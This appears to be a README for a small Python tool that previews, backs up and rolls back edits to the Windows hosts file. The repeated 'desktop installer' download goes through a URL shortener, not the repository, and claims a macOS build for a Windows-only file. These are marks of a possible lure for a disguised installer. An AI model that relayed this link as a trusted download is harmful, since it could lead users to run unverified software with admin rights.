![Hosts File Guard](assets/hero.png)

# Hosts File Guard

*A safer way to edit `C:\Windows\System32\drivers\etc\hosts`.*

## Overview

**Hosts File Guard** runs on your own PC. Edit the Windows hosts file with a preview, checksum, and one-click rollback to the last good copy.

A bad hosts line can break Windows Update, VPNs, or the browser.

The CLI in this repository is the documented interface; the desktop build is the same job in an installer.

## Editions

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Highlights

- Loads the live hosts file and shows a unified diff before save
- Writes a dated backup next to the file
- Restores the last good copy if DNS lookups fail a quick check
- Blocks empty or duplicate wildcard rules

## Background

Notepad-as-admin has no preview and no undo. This tool diffs the change, writes a backup, then applies it.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/isaahughes08/hosts-file-guard

MIT license. See `LICENSE`.
